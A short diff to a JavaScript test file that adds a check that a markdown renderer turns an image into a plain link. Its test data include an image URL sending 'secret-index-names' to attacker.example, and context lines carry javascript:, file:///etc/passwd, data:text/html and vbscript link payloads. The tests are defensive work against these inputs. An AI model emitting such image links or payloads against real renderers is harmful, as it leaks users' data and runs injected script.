@@ -35,6 +35,14 @@ describe('renderMarkdown in the renderer', () => {
 		expect(window.pwned).toBeUndefined()
 	})
 
+	it('never renders an image, so nothing is fetched without a click', () => {
+		const html = dom('Summary ![x](https://attacker.example/p?d=secret-index-names)')
+		expect(html.querySelector('img')).toBeNull()
+		const link = html.querySelector('a')
+		expect(link.getAttribute('href')).toBe('https://attacker.example/p?d=secret-index-names')
+		expect(link.getAttribute('target')).toBe('_blank')
+	})
+
 	it('refuses script, file, and data links', () => {
 		const html = dom('[a](javascript:alert(1)) [b](file:///etc/passwd) [c](data:text/html,<b>x</b>) [d](vbscript:msgbox)')
 		expect(html.querySelector('a')).toBeNull()
